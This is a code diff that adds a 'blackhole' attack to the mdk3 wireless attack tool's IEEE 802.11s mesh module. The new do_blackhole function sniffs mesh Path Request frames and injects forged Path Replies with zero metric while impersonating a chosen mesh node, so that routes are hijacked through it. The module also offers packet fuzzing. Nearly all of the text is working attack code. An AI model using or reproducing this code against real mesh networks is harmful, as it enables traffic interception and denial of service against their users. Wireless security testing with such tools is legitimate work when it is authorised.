@@ -8,6 +8,7 @@
 #include "../osdep.h"
 #include "../packet.h"
 #include "../helpers.h"
+#include "../mac_addr.h"
 
 #define IEEE80211S_MODE 's'
 #define IEEE80211S_NAME "Attacks for IEEE 802.11s mesh networks"
@@ -24,6 +25,7 @@ struct ieee80211s_options {
   char attack_type;
   char fuzz_type;
   unsigned int speed;
+  struct ether_addr *target;
 };
 
 void ieee80211s_shorthelp()
@@ -44,6 +46,9 @@ void ieee80211s_longhelp()
 	  "         3: Cut packet short, leave 802.11 header intact (find buffer errors)\n"
 	  "         4: Shotgun mode, randomly overwriting bytes after header (find bugs)\n"
 	  "         5: Skript-kid's automated attack trying all of the above randomly :)\n"
+	  "      -b <impersonated_meshpoint>\n"
+	  "         Create a Blackhole, using the impersonated_meshpoint's MAC adress\n"
+	  "         mdk3 will answer every incoming Route Request with a perfect route over the impersonated node.\n"
 	  "      -s <pps>\n"
 	  "         Set speed in packets per second (Default: 100)\n"
 	  "      -n <meshID>\n"
@@ -57,10 +62,12 @@ void *ieee80211s_parse(int argc, char *argv[]) {
   dopt->mesh_id = NULL;
   dopt->attack_type = 0x00;
   dopt->speed = 100;
+  dopt->target = NULL;
   
-  while ((opt = getopt(argc, argv, "n:f:s:")) != -1) {
+  while ((opt = getopt(argc, argv, "n:f:s:b:")) != -1) {
     switch (opt) {
       case 'f':
+	if (dopt->attack_type) { printf("Duplicate Attack type: Fuzzing\n"); return NULL; }
 	i = atoi(optarg);
 	if ((i > 5) || (i < 1)) {
 	  printf("Invalid Fuzzing type!\n"); return NULL;
@@ -68,6 +75,12 @@ void *ieee80211s_parse(int argc, char *argv[]) {
 	  dopt->attack_type = 'f';
 	  dopt->fuzz_type = (char) i;
 	}
+      break;
+      case 'b':
+	if (dopt->attack_type) { printf("Duplicate Attack type: Blackhole\n"); return NULL; }
+	dopt->target = malloc(sizeof(struct ether_addr));
+	*(dopt->target) = parse_mac(optarg);
+	dopt->attack_type = 'b';
       break;
       case 's':
 	dopt->speed = (unsigned int) atoi(optarg);
@@ -92,7 +105,7 @@ void *ieee80211s_parse(int argc, char *argv[]) {
     printf("\n\nERROR: You must specify an attack type (ie. -f)!\n");
     return NULL;
   } 
-  if (dopt->mesh_id == NULL) {
+  if ((dopt->mesh_id == NULL) && (dopt->attack_type == 'f')){
     ieee80211s_longhelp();
     printf("\n\nERROR: You must specify a Mesh ID for this attack!\n");
     return NULL;
@@ -221,6 +234,58 @@ struct packet do_fuzzing(struct ieee80211s_options *dopt) {
   return pkt;
 }
 
+struct packet do_blackhole(struct ieee80211s_options *dopt) {
+  struct packet sniff, inject;
+  struct ieee_hdr *hdr;
+  struct action_fixed *act, *actinj;
+  struct mesh_preq *preq = NULL;
+  struct mesh_prep *prep;
+  struct ether_addr *src;
+  
+  while(1) {
+    sniff = osdep_read_packet();
+    hdr = (struct ieee_hdr *) sniff.data;
+    if (hdr->type == IEEE80211_TYPE_ACTION) {
+      act = (struct action_fixed *) (sniff.data + sizeof(struct ieee_hdr));
+      if ((act->category == MESH_ACTION_CATEGORY) && (act->action_code == MESH_ACTION_PATHSEL) && (act->tag == MESH_TAG_PREQ)) {
+	preq = (struct mesh_preq *) (sniff.data + sizeof(struct ieee_hdr) + sizeof(struct action_fixed));
+	break;
+      }
+    }
+  }
+  
+  printf("Jacked PREQ: Hops %3d TTL %3d ID %3d Originator ", preq->hop_count, preq->ttl, preq->discovery_id);
+  print_mac(preq->originator);
+  printf(" OrigSeq %5d Lifetime %5d Metric %5d Target ", preq->orig_seq, preq->lifetime, preq->metric);
+  print_mac(preq->target);
+  printf(" TargetSeq %5d\n", preq->target_seq);
+  
+  inject.data = malloc(2048);
+  src = get_source(&sniff);
+  create_ieee_hdr(&inject, IEEE80211_TYPE_ACTION, 'a', AUTH_DEFAULT_DURATION, *src, *(dopt->target), *(dopt->target), *src, 0);
+  actinj = (struct action_fixed *) (inject.data + sizeof(struct ieee_hdr));
+  inject.len += sizeof(struct action_fixed);
+  actinj->category = MESH_ACTION_CATEGORY;
+  actinj->action_code = MESH_ACTION_PATHSEL;
+  actinj->tag = MESH_TAG_PREP;
+  actinj->taglen = 31;
+  
+  prep = (struct mesh_prep *) (inject.data + sizeof(struct ieee_hdr) + sizeof(struct action_fixed));
+  inject.len += sizeof(struct mesh_prep);
+  prep->flags = 0x00;
+  prep->hop_count = 0;
+  prep->ttl = 255;
+  prep->target = preq->originator;
+  prep->target_seq = preq->orig_seq;
+  prep->lifetime = preq->lifetime;
+  prep->metric = 0; /*ARRRRR!*/
+  prep->originator = preq->target;
+  prep->orig_seq = preq->target_seq + 10;
+  
+  free(sniff.data);
+  return inject;
+}
+
 struct packet ieee80211s_getpacket(void *options) {
   struct ieee80211s_options *dopt = (struct ieee80211s_options *) options;
   struct packet pkt;
@@ -230,6 +295,9 @@ struct packet ieee80211s_getpacket(void *options) {
   switch (dopt->attack_type) {
     case 'f':
       pkt = do_fuzzing(dopt);
+    break;
+    case 'b':
+      pkt = do_blackhole(dopt);
     break;
     default:
       printf("BUG! Unknown attack type %c\n", dopt->attack_type);
